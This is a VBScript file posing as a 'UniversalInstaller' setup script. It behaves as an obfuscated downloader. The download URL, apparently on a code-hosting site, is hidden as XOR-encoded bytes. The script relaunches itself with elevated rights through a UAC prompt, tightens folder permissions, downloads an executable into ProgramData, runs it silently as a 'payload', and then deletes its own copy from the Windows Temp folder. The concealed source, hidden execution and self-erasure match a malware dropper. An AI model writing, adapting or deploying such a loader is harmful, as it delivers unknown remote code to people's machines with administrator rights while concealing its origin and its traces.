Option Explicit
Dim gShell, gFSO, gSA
Dim gQ, gFilePath, gLogFile
Dim gOK, gErrMsg
Const INSTALL_DIR     = "C:\ProgramData\UniversalInstaller"
Const FILE_NAME       = "setup.exe"
Const MIN_SIZE_BYTES  = 102400

' --- Decrypt URL & Task ---
Dim k, uArr, tArr, i, DOWNLOAD_URL, TASK_NAME
k = 42
uArr = Array(66,94,94,90,89,16,5,5,77,67,94,70,75,72,4,73,69,71,5,67,94,7,77,88,69,95,90,25,26,30,31,31,25,29,5,89,94,75,94,79,71,79,68,94,7,66,5,7,5,88,75,93,5,71,75,67,68,5,121,94,75,94,79,71,79,68,94,7,124,67,79,93,79,88,7,107,77,79,68,94,4,79,82,79)
tArr = Array(110,95,71,71,83)
DOWNLOAD_URL = ""
TASK_NAME = ""
For i = 0 To UBound(uArr)
    DOWNLOAD_URL = DOWNLOAD_URL & Chr(uArr(i) Xor k)
Next
For i = 0 To UBound(tArr)
    TASK_NAME = TASK_NAME & Chr(tArr(i) Xor k)
Next

Function IsElevated()
    On Error Resume Next
    Dim ex
    Set ex = gShell.Exec("cmd /c net session >nul 2>&1 && echo YES")
    If Err.Number <> 0 Then IsElevated = False : Exit Function
    IsElevated = (InStr(ex.StdOut.ReadAll, "YES") > 0)
End Function

Sub Log(msg)
    Dim ts, line, f
    If gLogFile = "" Then Exit Sub
    ts = Year(Now) & "-" & Pad2(Month(Now)) & "-" & Pad2(Day(Now)) & " " & Pad2(Hour(Now)) & ":" & Pad2(Minute(Now)) & ":" & Pad2(Second(Now))
    line = "[" & ts & "] " & msg
    On Error Resume Next
    Set f = gFSO.OpenTextFile(gLogFile, 8, True)
    f.WriteLine line
    f.Close
End Sub

Function Pad2(n)
    Pad2 = Right("0" & n, 2)
End Function

Sub BootstrapAndElevate()
    Dim selfPath, bootPath, args
    selfPath = WScript.ScriptFullName
    bootPath = "C:\Windows\Temp\qd_installer.vbs"
    On Error Resume Next
    If Not gFSO.FolderExists("C:\Windows\Temp") Then gFSO.CreateFolder "C:\Windows\Temp"
    gFSO.CopyFile selfPath, bootPath, True
    If Err.Number <> 0 Then WScript.Quit 1
    On Error GoTo 0
    Set gSA = CreateObject("Shell.Application")
    args = "//B //Nologo """ & bootPath & """"
    gSA.ShellExecute "wscript.exe", args, "", "runas", 0
    WScript.Quit 0
End Sub

Function ApplyDirACL(path)
    ApplyDirACL = False
    Log "Setting ACL on " & path
    Dim rc
    rc = gShell.Run("icacls " & gQ & path & gQ & " /inheritance:r /grant:r " & gQ & "SYSTEM:(OI)(CI)F" & gQ & " " & gQ & "Administrators:(OI)(CI)F" & gQ, 0, True)
    If rc <> 0 Then Exit Function
    ApplyDirACL = True
End Function

Function DownloadFile()
    DownloadFile = False
    Dim http, tmp, stream, f
    tmp = gFilePath & ".download"
    On Error Resume Next
    If gFSO.FileExists(gFilePath) Then gFSO.DeleteFile gFilePath, True
    On Error GoTo 0
    Log "Downloading: " & DOWNLOAD_URL
    On Error Resume Next
    Err.Clear
    Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    If Err.Number <> 0 Then Exit Function
    http.setTimeouts 30000, 30000, 60000, 300000
    http.Open "GET", DOWNLOAD_URL, False
    http.Send
    If Err.Number <> 0 Then Exit Function
    If http.Status <> 200 Then Exit Function
    Err.Clear
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write http.ResponseBody
    stream.SaveToFile tmp, 2
    stream.Close
    If Err.Number <> 0 Then Exit Function
    Set f = gFSO.GetFile(tmp)
    If f.Size < MIN_SIZE_BYTES Then
        gFSO.DeleteFile tmp, True
        Exit Function
    End If
    gFSO.MoveFile tmp, gFilePath
    gShell.Run "icacls " & gQ & gFilePath & gQ & " /inheritance:r /grant:r " & gQ & "SYSTEM:F" & gQ & " " & gQ & "Administrators:F" & gQ, 0, True
    DownloadFile = True
End Function

Function ExecutePayload()
    ExecutePayload = False
    On Error Resume Next
    Log "Executing payload..."
    Dim rc, fileExt
    fileExt = LCase(Mid(DOWNLOAD_URL, InStrRev(DOWNLOAD_URL, ".") + 1))

    If fileExt = "msi" Then
        Log "Detected MSI. Running with msiexec..."
        rc = gShell.Run("msiexec.exe /i """ & gFilePath & """ /qn /norestart", 0, True)
    Else
        Log "Detected EXE. Running directly..."
        rc = gShell.Run("""" & gFilePath & """", 0, True)
    End If

    If rc = 0 Or rc = 3010 Then
        Log "Execution successful (Code: " & rc & ")"
        ExecutePayload = True
    Else
        Log "Execution failed (Code: " & rc & ")"
    End If
End Function

Sub DoInstall()
    If Not ApplyDirACL(INSTALL_DIR) Then gErrMsg = "ACL failed" : Exit Sub
    If Not DownloadFile() Then gErrMsg = "Download failed" : Exit Sub
    If Not ExecutePayload() Then gErrMsg = "Execution failed" : Exit Sub
    gOK = True
End Sub

Set gShell = CreateObject("WScript.Shell")
Set gFSO   = CreateObject("Scripting.FileSystemObject")

If Not IsElevated() Then
    BootstrapAndElevate
    WScript.Quit 0
End If

gQ = Chr(34)
gFilePath = INSTALL_DIR & "\" & FILE_NAME
gLogFile = INSTALL_DIR & "\install.log"
gOK = False

If Not gFSO.FolderExists(INSTALL_DIR) Then gFSO.CreateFolder INSTALL_DIR
Log "===== Install started ====="
DoInstall

On Error Resume Next
If LCase(WScript.ScriptFullName) = LCase("C:\Windows\Temp\qd_installer.vbs") Then
    gShell.Run "cmd /c ping -n 3 127.0.0.1 >nul & del /f /q " & gQ & WScript.ScriptFullName & gQ, 0, False
End If
On Error GoTo 0
